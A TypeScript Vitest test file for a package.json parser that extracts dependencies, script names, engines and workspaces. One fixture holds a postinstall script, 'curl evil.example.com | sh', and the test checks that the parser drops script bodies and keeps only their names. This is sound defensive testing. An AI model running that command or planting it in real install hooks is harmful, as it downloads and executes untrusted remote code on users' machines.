import { describe, expect, it } from "vitest";
import { parsePackageJson } from "./package-json";

describe("parsePackageJson", () => {
  it("extracts the fields detectors rely on", () => {
    const parsed = parsePackageJson(
      JSON.stringify({
        name: "vibe-business",
        private: true,
        scripts: { dev: "next dev", build: "next build" },
        dependencies: { next: "16.3.0", react: "19.2.8" },
        devDependencies: { typescript: "^5", vitest: "4.1.10" },
        engines: { node: ">=20.9.0" },
        packageManager: "pnpm@11.21.0",
      }),
    );

    expect(parsed).not.toBeNull();
    expect(parsed?.name).toBe("vibe-business");
    expect(parsed?.private).toBe(true);
    expect(parsed?.dependencies).toEqual(["next", "react"]);
    expect(parsed?.devDependencies).toEqual(["typescript", "vitest"]);
    expect(parsed?.allDependencies).toEqual(["next", "react", "typescript", "vitest"]);
    expect(parsed?.engines).toEqual({ node: ">=20.9.0" });
    expect(parsed?.packageManagerHint).toBe("pnpm");
  });

  it("keeps script names but never script bodies", () => {
    const parsed = parsePackageJson(
      JSON.stringify({ scripts: { postinstall: "curl evil.example.com | sh" } }),
    );

    expect(parsed?.scriptNames).toEqual(["postinstall"]);
    expect(JSON.stringify(parsed)).not.toContain("curl");
  });

  it("returns null for invalid JSON instead of throwing", () => {
    expect(parsePackageJson("{ not json")).toBeNull();
  });

  it("returns null for JSON that is not an object", () => {
    expect(parsePackageJson('"a string"')).toBeNull();
    expect(parsePackageJson("[]")).toBeNull();
  });

  it("tolerates missing sections", () => {
    const parsed = parsePackageJson(JSON.stringify({ name: "minimal" }));
    expect(parsed?.dependencies).toEqual([]);
    expect(parsed?.scriptNames).toEqual([]);
    expect(parsed?.workspaces).toEqual([]);
    expect(parsed?.private).toBe(false);
  });

  it("reads array-form workspaces", () => {
    const parsed = parsePackageJson(JSON.stringify({ workspaces: ["apps/*", "packages/*"] }));
    expect(parsed?.workspaces).toEqual(["apps/*", "packages/*"]);
  });

  it("reads object-form workspaces", () => {
    const parsed = parsePackageJson(JSON.stringify({ workspaces: { packages: ["apps/*"] } }));
    expect(parsed?.workspaces).toEqual(["apps/*"]);
  });

  it("ignores non-string entries defensively", () => {
    const parsed = parsePackageJson(JSON.stringify({ engines: { node: 20 }, workspaces: [1, "apps/*"] }));
    expect(parsed?.engines).toEqual({});
    expect(parsed?.workspaces).toEqual(["apps/*"]);
  });
});
